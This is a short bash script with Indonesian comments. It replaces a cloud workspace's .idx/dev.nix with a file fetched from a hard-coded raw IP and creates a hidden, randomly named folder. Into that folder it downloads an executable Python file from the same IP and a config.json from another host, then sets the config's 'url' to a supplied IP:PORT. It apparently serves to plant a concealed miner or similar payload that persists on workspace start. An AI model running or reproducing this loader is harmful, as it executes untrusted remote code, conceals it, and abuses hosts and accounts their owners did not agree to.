#!/bin/bash
# Buat nama random
NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)

# Ambil argumen pertama (IP:PORT)
URL="${1:-}"

# Validasi input
if [ -z "$URL" ]; then
    echo "Usage: $0 <IP:PORT>"
    echo "Contoh: $0 102.210.254.203:80"
    exit 1
fi

# Download file dev.nix dan ganti kata 'ganti'
wget -q -O .idx/dev.nix http://143.198.196.235/dev.nix
sed -i "s/ganti/${NAME}/g" .idx/dev.nix

cd ~/
# Buat folder sesuai nama random
mkdir ".$NAME"
cd ".$NAME" || exit 1

# Download file python & config.json
wget -q -O "${NAME}" http://143.198.196.235/dev.py
wget -q -O config.json https://dot-store.biz.id/bagong.json

# Ganti "url" di config.json dengan IP:PORT yang dikirim lewat argumen
sed -i "s/\"url\": *\"[^\"]*\"/\"url\": \"${URL}\"/" config.json

# Jadikan file python executable
chmod +x config.json
chmod +x "${NAME}"

echo "✅ Selesai. URL di-set ke ${URL}, file ada di .idx/${NAME}/${NAME}"
